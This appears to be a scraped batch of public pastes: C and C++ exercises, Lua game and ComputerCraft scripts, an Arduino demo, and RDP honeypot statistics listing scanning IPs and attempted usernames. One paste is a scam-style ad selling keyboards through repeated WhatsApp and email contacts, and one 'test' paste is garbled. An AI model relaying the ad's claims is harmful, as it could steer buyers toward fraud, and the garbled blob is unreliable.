    for(int i = 1 ; i <= N ; i++){
        printf(""%d "", attack_times[i]);
        // ll gained_power[MAXN+1] = {0};
        for(int j = 0 ; j < power_gains[i].size ; j++){
            if(j == 0){
                printf(""%lld "", power_gains[i].array[j]);
            }
            else{
                printf(""%lld "", power_gains[i].array[j] - power_gains[i].array[j-1]);
            }
        }
        printf(""\n"");
    }
    return;
}

int main()
{

    int N, T, M;
    scanf(""%d%d%d"", &N, &T, &M);

    // both index are labels
    int label[MAXN+1] = {0};
    int rank[MAXN+1] = {0};
    ll power[MAXN+1];
    label[0] = -1;
    power[0] = -1;

    Vector power_gains[MAXN+1];
    power_gains;
    int attack_times[MAXN+1] = {0};
    for(int i = 1 ; i <= N ; i++){
        label[i] = i;
        rank[i] = i;
        Vector_init(&(power_gains[i]));

        scanf(""%lld"", &(power[i]));
    }


    for(int i  = 0 ; i < T ; i++){
        int type;
        scanf(""%d"", &type);
        if(type == 1){
            int attacker;
            scanf(""%d"", &attacker);
            Attack(label, rank, power, &(power_gains[attacker]), attack_times, attacker, N, M);
            //PrintStatus(label, power, N);
        }
        else if(type == 2){
            Reward(power, N);
            //PrintStatus(label, power, N);
        }
        else if(type == 3){
            ll standard;
            scanf(""%lld"", &standard);
            Query(label, power, standard, N);
        }
        else if(type == 4){
            int target_label, attack_tms;
            scanf(""%d%d"", &target_label, &attack_tms);
            GetPowerGains(&(power_gains[target_label]), attack_times, target_label, attack_tms);
        }
        else{
            printf(""Wrond type.\n"");
            exit(1);
        }
    }
    PrintGameRecord(power_gains, attack_times, N);
    return 0;
}"
rt1Dkthi,Stack.cpp,ryancnap,C++,Saturday 23rd of March 2024 10:21:54 PM CDT,"// Stack class' destructor, pop every element so long as pop(element) returns true.
Stack::~Stack()
{
    int e;
    while (pop(e));
}

void Stack::push(int e)

{
    // Whenever we push, we create a pointer to a new node on the stack, keep in mind that NULL is the value that *top points to when push() is first called.
    // New node is a pointer that has a value element, and a pointer *next, which points to null.
    StackNode *newNode = new StackNode();

    // This node's element is now equal to the value we're passing in.
    newNode->element = e;

    // This node's *next pointer now points to *top, which is a node pointing to NULL whenever we push().
    newNode->next = top;

    // The Stack's *top pointer is a node that now points to this node, instead of null.
    top = newNode;
    counter += 1;
}

int Stack::pop(int &e)
{
    if (top == NULL)
        return false;
    // delNode points to top.
    StackNode *delNode = top;

    // Whatever value we're passing in (node we're currently on) is set equal to *top's element, ie this current node's element.
    e = top->element;

    // *top is now equal to this node's *next, which points to the value below it.
    top = top->next;

    // Remove the current node.
    delete delNode;
    counter -= 1;
    return e;
}


void Test()
{

    int e;
    Stack *mainStack = new Stack();
    Stack *tempStack = new Stack();

    if (mainStack->empty())
                cout << ""\nThe stack is empty.\n\n"";
        else
        {
            cout << ""\nStack: "";
            while (mainStack->pop(e))
                {
                    tempStack->push(e);
                }
                while (tempStack->pop(e))
                {
                    cout << e << "", "";
                    mainStack->push(e);
                }
                cout << ""\n\n"";
        }

}
"
H0mhDTqW,Stack.h,ryancnap,C++,Saturday 23rd of March 2024 10:21:15 PM CDT,"
class StackNode
{
    public:
        // Each node has an integer element and pointer *next.
        // Each node's *next will point to null.
        int element;
        StackNode *next;

        // Constructor, set next to point to null.
        StackNode() {next = NULL;};
};



class Stack
{
    private:
        // Top is a node that points to null on creation, see constructor.
        StackNode *top;
    public:
        Stack() {top = NULL;};

        // Destructor, implemented in Stack.cpp
        ~Stack();

        // Public operations to push and pop an element e from stack, pass by reference to pop() so we can get data back from what we pop.
        // push() does not have to return any value, but pop() will return a boolean so we know whether or not it was successful.
        int counter = 0;
        void push (int e);
        int pop(int &e);

        // If the stack is empty, ie if top is not pointing to anything, we will return true.
        bool empty() {return top == NULL;};

        void Test();

};

#include ""Stack.cpp""
"
gyneiTzd,main.cpp,ryancnap,C++,Saturday 23rd of March 2024 10:20:29 PM CDT,"// Reverse notation calculator.
using namespace std;

#include <iostream>
#include<limits>
#include ""Stack.h""

Stack IntStack;
Stack temp;
int i;

char menu();
void displayStack();

bool add();
bool subtract();
bool multiply();
bool divide();


int main()
{
    char userSelection = ' ';
    do
    {
        userSelection = menu();
        switch (userSelection)
        {
            case '=':
                cout << ""\nEnter number to add to the stack: "";
                cin >> i;
                IntStack.push(i);
                break;

            case '+':
                add();
                break;

            case '-':
                subtract();
                break;

            case '*':
                multiply();
                break;

            case '/':
                divide();
                break;

            case 'P':
            case 'p':
                if (!IntStack.empty())
                {
                    IntStack.pop(i);
                    cout << ""\n"" << i << "" is removed from the stack.\n\n"";
                }
                else
                    cout << ""\n Nothing to pop, stack is already empty.\n\n"";
                break;

            case 'C':
            case 'c':
                while (IntStack.pop(i));
                break;

            case 'Q':
            case 'q':
                cout << ""\n Quitting..."";
                break;

            default:
                cout << ""\nPlease enter valid input.\n"";
                break;

        }

    } while (userSelection != 'Q' && userSelection != 'q');


    return 0;
}


// Display menu.
char menu()
{
    char input;
    displayStack();
    cout << ""= ... Add new number to the stack \n"";
    cout << ""+ ... Add last two numbers on the stack \n"";
    cout << ""- ... Subtract last two numbers on the stack \n"";
    cout << ""* ... Multiply last two numbers on the stack \n"";
    cout << ""/ ... Divide number to the stack \n"";
    cout << ""P ... Pop and discard top number from the stack \n"";
    cout << ""C ... Clear the stack \n"";
    cout << ""Q ... Quit \n"";
    cout << ""\nCommand: "";
    cin >> input;
    return input;
}


// Stack magic.
void displayStack()
{
    if (IntStack.empty())
            cout << ""\nThe stack is empty.\n\n"";
    else
    {
        cout << ""\nStack: "";
        while (IntStack.pop(i))
            {
                temp.push(i);
            }
            while (temp.pop(i))
            {
                IntStack.push(i);
                if (IntStack.counter <= 1)
                    cout << i;
                else if (IntStack.counter > 1)
                    cout << "", "" << i;
            }
            cout << ""\n\n"";
    }
}



bool add()
{
    if (IntStack.counter <= 1)
    {
        cout << ""\n Cannot calculate a stack with only one number\n\n"";
        return false;
    }
    int sum1 = IntStack.pop(i);
    int sum2 = IntStack.pop(i);
    int answer = sum1 + sum2;
    cout << ""\n"" << sum2 << "" + "" << sum1 << "" = "" << answer << endl;
    IntStack.push(answer);
    return true;
}



bool subtract()
{
    // TODO
}



bool multiply()
{
    // TODO
}



bool divide()
{
    // TODO
    //  b. if division by zero would occur, put the stack back to how it was before the operation was attempted.
}

"
ThPkeUi5,AOE4 SCAR SCRIPT Remove all units for player,jaxx0rr,Lua,Saturday 23rd of March 2024 10:09:43 PM CDT,"	local egroup = Player_GetAllEntities(player.id)	
	
	for i = 1, EGroup_CountSpawned(egroup) do
		local entity = EGroup_GetEntityAt(egroup, i)	
		Entity_Kill(entity)
	end"
Gv5we5L4,Bubble sort C,IlanZiin,C,Saturday 23rd of March 2024 10:04:56 PM CDT,"#include <stdio.h>
#include <string.h>

void sort(int array[], int size) {
    for(int i = 0; i < size - 1; i++){
        for(int j = 0; j < size - i - 1; j++){
            if(array[j] > array[j + 1]) {
                int temp = array[j];
                array[j] = array[j + 1];
                array[j + 1] = temp;
            }
        }
    }
}

void printArray(int array[], int size) {
    for(int i = 0; i < size; i++) {
        printf(""%d "", array[i]);
    }
}

int main() {
    
    int array[] = {7, 4, 2, 3, 1, 5, 9};
    int size = sizeof(array)/sizeof(array[0]);

    sort(array, size);
    printArray(array, size);

    return 0;
}"
FvjpssH4,koby rohu,KOBYROHU001,C#,Saturday 23rd of March 2024 09:36:31 PM CDT,"Yamaha Genos,Yamaha Tyros5,Yamaha PSR Sx 700,Korg PA4X📲WHATSAPPCHAT:+1(780)-299-9797

📫Gmail: kobyrohu@gmail.com
📫MSN: kobyrohu@outlook.com
📫YAHOO: kobyrohu@yahoo.com
📲WHATSAPP: +1 780-299-9797
SKYPE: live:.cid.9adf44d941a12dd9

Yamaha Tyros 5 76-Key Arranger Workstation Keyboard 
3 speakers
Status
AC power cord
Music rest and brackets
CD-ROM
Owner's Manual
Installation Guide
User Registration Card
Warranty: 3 Years Manufacturer's Warranty

Yamaha Tyros 5 76-Key Arranger Workstation Keyboard 
Yamaha Tyros 4 61-Key Arranger Workstation Keyboard
Yamaha Tyros 3 61 Key Keyboard
Yamaha Motif XS8 88-Key Keyboard
Yamaha Motif XS7 76-Key Keyboard 
Yamaha Tyros2 61-Key Keyboard
Yamaha PSR-S700 61-Key Portable
Yamaha PSR-S900 - 61-Key Arranger Workstation 

Korg Pa2XPro 76-key arranger keyboard
KORG PA800 PRO ARRANGE
Korg OASYS 88 88-Key Workstation 
Korg PA500 61-key Arranger Keyboard
Why buy from us?
* Your privacy is assured
* Secure transaction guaranteed
* We offer 90 days return policy and 100% money back guarantee.

Email: KobyRohu@net-shopping.com
Gmail: kobyrohu@gmail.com
MSN: kobyrohu@outlook.com
YAHOO: kobyrohu@yahoo.com
WHATSAPPCHAT +1 780-299-9797
SKYPE: live:.cid.9adf44d941a12dd9 
"
tzApYkjU,grifControles,kalibre,Arduino,Saturday 23rd of March 2024 08:37:46 PM CDT,"//bem10jfx.blogspot.com.br
// Inicializando o objeto do display TFT
Adafruit_ST7735 tft = Adafruit_ST7735(10,  9, 8);
void setup() {   
  tft.initR(INITR_BLACKTAB); // Initializaçao....
  //display
  tft.fillScreen(ST7735_WHITE);
}
void loop() {
                 x0 ,y0 ,x1, y1, x2, y2
tft.fillTriangle(10, 10, 60, 10, 35, 50, ST7735_RED);
//                 //x//y//R  //color
tft.fillCircle(50, 125, 25, ST7735_GREEN);
//         //x1 //x2//W=40//H=40
tft.fillRect(70, 40, 40, 40, ST7735_BLUE);
 delay(500);
 }"
LAuqxPUU,test,dauserr,Lua,Saturday 23rd of March 2024 08:31:14 PM CDT,"3,130|[[{!  A p -!% : 0 ,!% c - > > 2 D < < n!/!1!% < >!-!7 5 5!4 a!( A :!$ A _ _ I S E X E C U T A B L E!) f a l s e!,!F _ E N!Q!S D!) t r u!Z!%!G S C R I P T T Y P E!0 S c r i p t!% }![!'!) 1![!6!0 3!4 L j!0 p!x n t ( ' h e y ' )!| ] ,!E 3!u!w!y t!4 2!0 t e s!{ A } ]"
902f4HA5,ComputerCraft Dissolution Chamber Fluids,djmattyg007,Lua,Saturday 23rd of March 2024 08:01:06 PM CDT,"require(""./lib/string_util"")

local periNamePrefix = ""industrialforegoing:dissolution_chamber_""
local numFilePath = ""/chamber""

local storage = peripheral.find(""rsBridge"")

local function readNumFile(filename)
    local file = fs.open(numFilePath .. ""/"" .. filename, ""r"")
    local contents = file.readAll()
    return contents:strip()
end

local periNums = {}
for _, name in pairs(fs.list(numFilePath)) do
    periNums[name] = readNumFile(name)
end

while true do
    for name, periNum in pairs(periNums) do
        local exportedAmount = storage.exportFluidToPeripheral({name=""industrialforegoing:"" .. name, count=2000}, periNamePrefix .. periNum)
        if exportedAmount > 0 then
            print(string.format(""Exported %d %s"", exportedAmount, name))
        end
    end
    os.sleep(5)
end
"
sVVJ62YJ,2024-03-23_stats.json,rdp_snitch,JSON,Saturday 23rd of March 2024 07:18:03 PM CDT,"{
  ""ip"": {
    ""107.167.82.123"": 3,
    ""185.170.144.3"": 9,
    ""167.94.145.54"": 3,
    ""103.47.194.205"": 3,
    ""188.119.66.112"": 3,
    ""58.218.204.183"": 9,
    ""198.235.24.68"": 9,
    ""87.251.75.64"": 3,
    ""87.251.75.145"": 9,
    ""212.70.149.142"": 15,
    ""45.227.254.49"": 6,
    ""104.37.187.184"": 6,
    ""194.165.16.78"": 6,
    ""84.201.2.2"": 6,
    ""185.170.144.113"": 9,
    ""36.91.222.100"": 6,
    ""196.190.117.7"": 6,
    ""87.251.75.120"": 6,
    ""103.151.53.100"": 9,
    ""91.240.118.29"": 6,
    ""198.235.24.239"": 9,
    ""62.204.41.123"": 6,
    ""103.14.49.13"": 12,
    ""120.240.145.8"": 3,
    ""152.32.149.246"": 3,
    ""185.81.68.38"": 9,
    ""103.179.148.51"": 180,
    ""213.109.202.23"": 9,
    ""103.20.97.235"": 3,
    ""198.235.24.52"": 9,
    ""45.227.254.8"": 6,
    ""103.213.215.23"": 6,
    ""2.57.149.186"": 3,
    ""45.227.254.26"": 6,
    ""103.116.39.106"": 3,
    ""96.8.115.25"": 3,
    ""212.70.149.146"": 3,
    ""205.210.31.249"": 9,
    ""101.200.164.85"": 24
  },
  ""asn"": {
    ""AS53755"": 3,
    ""AS197414"": 18,
    ""AS398705"": 3,
    ""AS140832"": 3,
    ""AS57523"": 18,
    ""AS4134"": 9,
    ""AS396982"": 36,
    ""AS208091"": 18,
    ""AS204428"": 18,
    ""AS267784"": 18,
    ""AS19318"": 6,
    ""AS48721"": 6,
    ""AS44066"": 6,
    ""AS7713"": 6,
    ""AS24757"": 6,
    ""AS135918"": 9,
    ""AS59425"": 6,
    ""AS149134"": 12,
    ""AS56040"": 3,
    ""AS135377"": 3,
    ""AS140224"": 180,
    ""AS208312"": 12,
    ""AS150880"": 3,
    ""AS45194"": 6,
    ""AS140810"": 3,
    ""AS36352"": 3,
    ""AS37963"": 24
  },
  ""isp"": {
    ""Input Output Flood LLC"": 3,
    ""Xhost Internet Solutions LP"": 36,
    ""Censys, Inc."": 3,
    ""FTECH"": 3,
    ""Chang Way Technologies Co. Limited"": 18,
    ""Chinanet"": 9,
    ""Google LLC"": 36,
    ""SS-Net"": 18,
    ""Flyservers S.A."": 24,
    ""Interserver, Inc"": 6,
    ""www.accelerated.de"": 6,
    ""PT Telekomunikasi Indonesia"": 6,
    ""Ethiotelecom"": 6,
    ""Viet Digital Technology Liability Company"": 9,
    ""Horizon LLC"": 6,
    ""Fute Commercial and Services Company Limited"": 12,
    ""China Mobile communications corporation"": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""STARCLOUD GLOBAL PTE., LTD."": 180,
    ""Red Byte LLC"": 12,
    ""Fast Byte Fast Data Company Limited"": 3,
    ""Syscon Infoway Pvt. Ltd."": 6,
    ""DNCLOUD"": 3,
    ""HostPapa"": 3,
    ""Hangzhou Alibaba Advertising Co"": 24
  },
  ""org"": {
    ""DemonVPS"": 3,
    ""Xhostis"": 18,
    ""Censys, Inc."": 3,
    ""Unknown"": 9,
    ""Chang Way Technologies Co. Limited"": 21,
    ""Chinanet JS"": 9,
    ""Palo Alto Networks, Inc"": 36,
    ""Xhost Internet Solutions"": 18,
    ""4Media Ltd"": 18,
    ""UAB Host Baltic"": 18,
    ""Interserver, Inc"": 6,
    ""Flyservers S.A"": 6,
    ""diva-e Datacenters GmbH"": 6,
    ""Telekomunikasi Indonesia"": 6,
    ""FLYCLOUD Company Limited"": 9,
    ""Horizon LLC"": 6,
    ""FUTE"": 12,
    ""China Mobile"": 3,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""Starcrecium Limited"": 9,
    ""Star Cloud Network Co., Ltd."": 180,
    ""FASTBYTE"": 3,
    ""London Broadband Services"": 6,
    ""Digital Network Cloud Company Limited"": 3,
    ""Michael Charlery"": 3,
    ""Aliyun Computing Co., LTD"": 24
  },
  ""regionName"": {
    ""Arizona"": 3,
    ""North Holland"": 36,
    ""Hesse"": 9,
    ""Hanoi"": 3,
    ""Moscow"": 33,
    ""Jiangsu"": 9,
    ""California"": 36,
    ""Sliven"": 18,
    ""Vilnius"": 18,
    ""New Jersey"": 6,
    ""Kaunas"": 6,
    ""Jakarta"": 6,
    ""Addis Ababa"": 6,
    ""Da Nang"": 9,
    ""Ho Chi Minh"": 15,
    ""Guangdong"": 3,
    ""Virginia"": 3,
    ""Tokyo"": 180,
    ""Maharashtra"": 6,
    ""Lesser Poland"": 3,
    ""Th\u1eeba Thi\u00ean Hu\u1ebf Province"": 3,
    ""Texas"": 3,
    ""Beijing"": 24
  },
  ""country"": {
    ""United States"": 51,
    ""The Netherlands"": 36,
    ""Germany"": 9,
    ""Vietnam"": 30,
    ""Russia"": 33,
    ""China"": 36,
    ""Bulgaria"": 18,
    ""Lithuania"": 24,
    ""Indonesia"": 6,
    ""Ethiopia"": 6,
    ""Japan"": 180,
    ""India"": 6,
    ""Poland"": 3
  },
  ""account"": {
    ""hello"": 258,
    ""Administr"": 48,
    ""(empty)"": 6,
    ""kMungmJPE"": 3,
    ""gyZEdw"": 3,
    ""GrOkGX"": 3,
    ""Test"": 57,
    ""Domain"": 27,
    ""ynUUNXcFk"": 3,
    ""LjAvzw"": 3,
    ""mELuBa"": 3,
    ""Administrator"": 3,
    ""VdUCwHCzY"": 3,
    ""CLBFkl"": 3,
    ""CXeZMF"": 3,
    ""hFOPanC"": 3,
    ""VDtZgNNkQ"": 3,
    ""nknSht"": 3,
    ""QBgxFl"": 3
  },
  ""keyboard"": {
    ""Unknown"": 438
  },
  ""client_build"": {
    ""Unknown"": 438
  },
  ""client_name"": {
    ""Unknown"": 438
  },
  ""ip_type"": {
    ""hosting"": 75,
    ""Unknown"": 327,
    ""proxy"": 27,
    ""hosting & proxy"": 6,
    ""mobile"": 3
  }
}"
nw76X4NP,2024-03-23_stats.json,rdp_snitch,JSON,Saturday 23rd of March 2024 07:16:15 PM CDT,"{
  ""ip"": {
    ""107.167.82.123"": 2,
    ""185.170.144.3"": 6,
    ""167.94.145.54"": 2,
    ""103.47.194.205"": 2,
    ""188.119.66.112"": 2,
    ""58.218.204.183"": 6,
    ""198.235.24.68"": 6,
    ""87.251.75.64"": 2,
    ""87.251.75.145"": 6,
    ""212.70.149.142"": 10,
    ""45.227.254.49"": 4,
    ""104.37.187.184"": 4,
    ""194.165.16.78"": 4,
    ""84.201.2.2"": 4,
    ""185.170.144.113"": 6,
    ""36.91.222.100"": 4,
    ""196.190.117.7"": 4,
    ""87.251.75.120"": 4,
    ""103.151.53.100"": 6,
    ""91.240.118.29"": 4,
    ""198.235.24.239"": 6,
    ""62.204.41.123"": 4,
    ""103.14.49.13"": 8,
    ""120.240.145.8"": 2,
    ""152.32.149.246"": 2,
    ""185.81.68.38"": 6,
    ""103.179.148.51"": 120,
    ""213.109.202.23"": 6,
    ""103.20.97.235"": 2,
    ""198.235.24.52"": 6,
    ""45.227.254.8"": 4,
    ""103.213.215.23"": 4,
    ""2.57.149.186"": 2,
    ""45.227.254.26"": 4,
    ""103.116.39.106"": 2,
    ""96.8.115.25"": 2,
    ""212.70.149.146"": 2,
    ""205.210.31.249"": 6,
    ""101.200.164.85"": 16
  },
  ""asn"": {
    ""AS53755"": 2,
    ""AS197414"": 12,
    ""AS398705"": 2,
    ""AS140832"": 2,
    ""AS57523"": 12,
    ""AS4134"": 6,
    ""AS396982"": 24,
    ""AS208091"": 12,
    ""AS204428"": 12,
    ""AS267784"": 12,
    ""AS19318"": 4,
    ""AS48721"": 4,
    ""AS44066"": 4,
    ""AS7713"": 4,
    ""AS24757"": 4,
    ""AS135918"": 6,
    ""AS59425"": 4,
    ""AS149134"": 8,
    ""AS56040"": 2,
    ""AS135377"": 2,
    ""AS140224"": 120,
    ""AS208312"": 8,
    ""AS150880"": 2,
    ""AS45194"": 4,
    ""AS140810"": 2,
    ""AS36352"": 2,
    ""AS37963"": 16
  },
  ""isp"": {
    ""Input Output Flood LLC"": 2,
    ""Xhost Internet Solutions LP"": 24,
    ""Censys, Inc."": 2,
    ""FTECH"": 2,
    ""Chang Way Technologies Co. Limited"": 12,
    ""Chinanet"": 6,
    ""Google LLC"": 24,
    ""SS-Net"": 12,
    ""Flyservers S.A."": 16,
    ""Interserver, Inc"": 4,
    ""www.accelerated.de"": 4,
    ""PT Telekomunikasi Indonesia"": 4,
    ""Ethiotelecom"": 4,
    ""Viet Digital Technology Liability Company"": 6,
    ""Horizon LLC"": 4,
    ""Fute Commercial and Services Company Limited"": 8,
    ""China Mobile communications corporation"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""STARCLOUD GLOBAL PTE., LTD."": 120,
    ""Red Byte LLC"": 8,
    ""Fast Byte Fast Data Company Limited"": 2,
    ""Syscon Infoway Pvt. Ltd."": 4,
    ""DNCLOUD"": 2,
    ""HostPapa"": 2,
    ""Hangzhou Alibaba Advertising Co"": 16
  },
  ""org"": {
    ""DemonVPS"": 2,
    ""Xhostis"": 12,
    ""Censys, Inc."": 2,
    ""Unknown"": 6,
    ""Chang Way Technologies Co. Limited"": 14,
    ""Chinanet JS"": 6,
    ""Palo Alto Networks, Inc"": 24,
    ""Xhost Internet Solutions"": 12,
    ""4Media Ltd"": 12,
    ""UAB Host Baltic"": 12,
    ""Interserver, Inc"": 4,
    ""Flyservers S.A"": 4,
    ""diva-e Datacenters GmbH"": 4,
    ""Telekomunikasi Indonesia"": 4,
    ""FLYCLOUD Company Limited"": 6,
    ""Horizon LLC"": 4,
    ""FUTE"": 8,
    ""China Mobile"": 2,
    ""Ucloud Information Technology (hk) Limited"": 2,
    ""Starcrecium Limited"": 6,
    ""Star Cloud Network Co., Ltd."": 120,
    ""FASTBYTE"": 2,
    ""London Broadband Services"": 4,
    ""Digital Network Cloud Company Limited"": 2,
    ""Michael Charlery"": 2,
    ""Aliyun Computing Co., LTD"": 16
  },
  ""regionName"": {
    ""Arizona"": 2,
    ""North Holland"": 24,
    ""Hesse"": 6,
    ""Hanoi"": 2,
    ""Moscow"": 22,
    ""Jiangsu"": 6,
    ""California"": 24,
    ""Sliven"": 12,
    ""Vilnius"": 12,
    ""New Jersey"": 4,
    ""Kaunas"": 4,
    ""Jakarta"": 4,
    ""Addis Ababa"": 4,
    ""Da Nang"": 6,
    ""Ho Chi Minh"": 10,
    ""Guangdong"": 2,
    ""Virginia"": 2,
    ""Tokyo"": 120,
    ""Maharashtra"": 4,
    ""Lesser Poland"": 2,
    ""Th\u1eeba Thi\u00ean Hu\u1ebf Province"": 2,
    ""Texas"": 2,
    ""Beijing"": 16
  },
  ""country"": {
    ""United States"": 34,
    ""The Netherlands"": 24,
    ""Germany"": 6,
    ""Vietnam"": 20,
    ""Russia"": 22,
    ""China"": 24,
    ""Bulgaria"": 12,
    ""Lithuania"": 16,
    ""Indonesia"": 4,
    ""Ethiopia"": 4,
    ""Japan"": 120,
    ""India"": 4,
    ""Poland"": 2
  },
  ""account"": {
    ""hello"": 172,
    ""Administr"": 32,
    ""(empty)"": 4,
    ""kMungmJPE"": 2,
    ""gyZEdw"": 2,
    ""GrOkGX"": 2,
    ""Test"": 38,
    ""Domain"": 18,
    ""ynUUNXcFk"": 2,
    ""LjAvzw"": 2,
    ""mELuBa"": 2,
    ""Administrator"": 2,
    ""VdUCwHCzY"": 2,
    ""CLBFkl"": 2,
    ""CXeZMF"": 2,
    ""hFOPanC"": 2,
    ""VDtZgNNkQ"": 2,
    ""nknSht"": 2,
    ""QBgxFl"": 2
  },
  ""keyboard"": {
    ""Unknown"": 292
  },
  ""client_build"": {
    ""Unknown"": 292
  },
  ""client_name"": {
    ""Unknown"": 292
  },
  ""ip_type"": {
    ""hosting"": 50,
    ""Unknown"": 218,
    ""proxy"": 18,
    ""hosting & proxy"": 4,
    ""mobile"": 2
  }
}"
UYMuTDLT,2024-03-23_stats.json,rdp_snitch,JSON,Saturday 23rd of March 2024 07:15:09 PM CDT,"{
  ""ip"": {
    ""107.167.82.123"": 1,
    ""185.170.144.3"": 3,
    ""167.94.145.54"": 1,
    ""103.47.194.205"": 1,
    ""188.119.66.112"": 1,
    ""58.218.204.183"": 3,
    ""198.235.24.68"": 3,
    ""87.251.75.64"": 1,
    ""87.251.75.145"": 3,
    ""212.70.149.142"": 5,
    ""45.227.254.49"": 2,
    ""104.37.187.184"": 2,
    ""194.165.16.78"": 2,
    ""84.201.2.2"": 2,
    ""185.170.144.113"": 3,
    ""36.91.222.100"": 2,
    ""196.190.117.7"": 2,
    ""87.251.75.120"": 2,
    ""103.151.53.100"": 3,
    ""91.240.118.29"": 2,
    ""198.235.24.239"": 3,
    ""62.204.41.123"": 2,
    ""103.14.49.13"": 4,
    ""120.240.145.8"": 1,
    ""152.32.149.246"": 1,
    ""185.81.68.38"": 3,
    ""103.179.148.51"": 60,
    ""213.109.202.23"": 3,
    ""103.20.97.235"": 1,
    ""198.235.24.52"": 3,
    ""45.227.254.8"": 2,
    ""103.213.215.23"": 2,
    ""2.57.149.186"": 1,
    ""45.227.254.26"": 2,
    ""103.116.39.106"": 1,
    ""96.8.115.25"": 1,
    ""212.70.149.146"": 1,
    ""205.210.31.249"": 3,
    ""101.200.164.85"": 8
  },
  ""asn"": {
    ""AS53755"": 1,
    ""AS197414"": 6,
    ""AS398705"": 1,
    ""AS140832"": 1,
    ""AS57523"": 6,
    ""AS4134"": 3,
    ""AS396982"": 12,
    ""AS208091"": 6,
    ""AS204428"": 6,
    ""AS267784"": 6,
    ""AS19318"": 2,
    ""AS48721"": 2,
    ""AS44066"": 2,
    ""AS7713"": 2,
    ""AS24757"": 2,
    ""AS135918"": 3,
    ""AS59425"": 2,
    ""AS149134"": 4,
    ""AS56040"": 1,
    ""AS135377"": 1,
    ""AS140224"": 60,
    ""AS208312"": 4,
    ""AS150880"": 1,
    ""AS45194"": 2,
    ""AS140810"": 1,
    ""AS36352"": 1,
    ""AS37963"": 8
  },
  ""isp"": {
    ""Input Output Flood LLC"": 1,
    ""Xhost Internet Solutions LP"": 12,
    ""Censys, Inc."": 1,
    ""FTECH"": 1,
    ""Chang Way Technologies Co. Limited"": 6,
    ""Chinanet"": 3,
    ""Google LLC"": 12,
    ""SS-Net"": 6,
    ""Flyservers S.A."": 8,
    ""Interserver, Inc"": 2,
    ""www.accelerated.de"": 2,
    ""PT Telekomunikasi Indonesia"": 2,
    ""Ethiotelecom"": 2,
    ""Viet Digital Technology Liability Company"": 3,
    ""Horizon LLC"": 2,
    ""Fute Commercial and Services Company Limited"": 4,
    ""China Mobile communications corporation"": 1,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""STARCLOUD GLOBAL PTE., LTD."": 60,
    ""Red Byte LLC"": 4,
    ""Fast Byte Fast Data Company Limited"": 1,
    ""Syscon Infoway Pvt. Ltd."": 2,
    ""DNCLOUD"": 1,
    ""HostPapa"": 1,
    ""Hangzhou Alibaba Advertising Co"": 8
  },
  ""org"": {
    ""DemonVPS"": 1,
    ""Xhostis"": 6,
    ""Censys, Inc."": 1,
    ""Unknown"": 3,
    ""Chang Way Technologies Co. Limited"": 7,
    ""Chinanet JS"": 3,
    ""Palo Alto Networks, Inc"": 12,
    ""Xhost Internet Solutions"": 6,
    ""4Media Ltd"": 6,
    ""UAB Host Baltic"": 6,
    ""Interserver, Inc"": 2,
    ""Flyservers S.A"": 2,
    ""diva-e Datacenters GmbH"": 2,
    ""Telekomunikasi Indonesia"": 2,
    ""FLYCLOUD Company Limited"": 3,
    ""Horizon LLC"": 2,
    ""FUTE"": 4,
    ""China Mobile"": 1,
    ""Ucloud Information Technology (hk) Limited"": 1,
    ""Starcrecium Limited"": 3,
    ""Star Cloud Network Co., Ltd."": 60,
    ""FASTBYTE"": 1,
    ""London Broadband Services"": 2,
    ""Digital Network Cloud Company Limited"": 1,
    ""Michael Charlery"": 1,
    ""Aliyun Computing Co., LTD"": 8
  },
  ""regionName"": {
    ""Arizona"": 1,
    ""North Holland"": 12,
    ""Hesse"": 3,
    ""Hanoi"": 1,
    ""Moscow"": 11,
    ""Jiangsu"": 3,
    ""California"": 12,
    ""Sliven"": 6,
    ""Vilnius"": 6,
    ""New Jersey"": 2,
    ""Kaunas"": 2,
    ""Jakarta"": 2,
    ""Addis Ababa"": 2,
    ""Da Nang"": 3,
    ""Ho Chi Minh"": 5,
    ""Guangdong"": 1,
    ""Virginia"": 1,
    ""Tokyo"": 60,
    ""Maharashtra"": 2,
    ""Lesser Poland"": 1,
    ""Th\u1eeba Thi\u00ean Hu\u1ebf Province"": 1,
    ""Texas"": 1,
    ""Beijing"": 8
  },
  ""country"": {
    ""United States"": 17,
    ""The Netherlands"": 12,
    ""Germany"": 3,
    ""Vietnam"": 10,
    ""Russia"": 11,
    ""China"": 12,
    ""Bulgaria"": 6,
    ""Lithuania"": 8,
    ""Indonesia"": 2,
    ""Ethiopia"": 2,
    ""Japan"": 60,
    ""India"": 2,
    ""Poland"": 1
  },
  ""account"": {
    ""hello"": 86,
    ""Administr"": 16,
    ""(empty)"": 2,
    ""kMungmJPE"": 1,
    ""gyZEdw"": 1,
    ""GrOkGX"": 1,
    ""Test"": 19,
    ""Domain"": 9,
    ""ynUUNXcFk"": 1,
    ""LjAvzw"": 1,
    ""mELuBa"": 1,
    ""Administrator"": 1,
    ""VdUCwHCzY"": 1,
    ""CLBFkl"": 1,
    ""CXeZMF"": 1,
    ""hFOPanC"": 1,
    ""VDtZgNNkQ"": 1,
    ""nknSht"": 1,
    ""QBgxFl"": 1
  },
  ""keyboard"": {
    ""Unknown"": 146
  },
  ""client_build"": {
    ""Unknown"": 146
  },
  ""client_name"": {
    ""Unknown"": 146
  },
  ""ip_type"": {
    ""hosting"": 25,
    ""Unknown"": 109,
    ""proxy"": 9,
    ""hosting & proxy"": 2,
    ""mobile"": 1
  }
}"
VczxJMPh,ComputerCraft Lua String Utils,djmattyg007,Lua,Saturday 23rd of March 2024 07:14:56 PM CDT,"function string:contains(sub)
    return self:find(sub, 1, true) ~= nil
end

function string:startswith(start)
    return self:sub(1, #start) == start
end

function string:endswith(ending)
    return ending == """" or self:sub(-#ending) == ending
end

function string:replace(old, new)
    local s = self
    local searchStartIdx = 1

    while true do
        local startIdx, endIdx = s:find(old, searchStartIdx, true)
        if (not startIdx) then
            break
        end

        local postfix = s:sub(endIdx + 1)
        s = s:sub(1, (startIdx - 1)) .. new .. postfix

        searchStartIdx = -1 * postfix:len()
    end

    return s
end

function string:insert(pos, text)
    return self:sub(1, pos - 1) .. text .. self:sub(pos)
end

local function lstrip_whitespace(s)
    local _, pos = s:find(""^%s+"")
    if pos then
        s = s:sub(pos + 1)
    end
    return s
end

local function rstrip_whitespace(s)
    pos = s:find(""%s+$"")
    if pos then
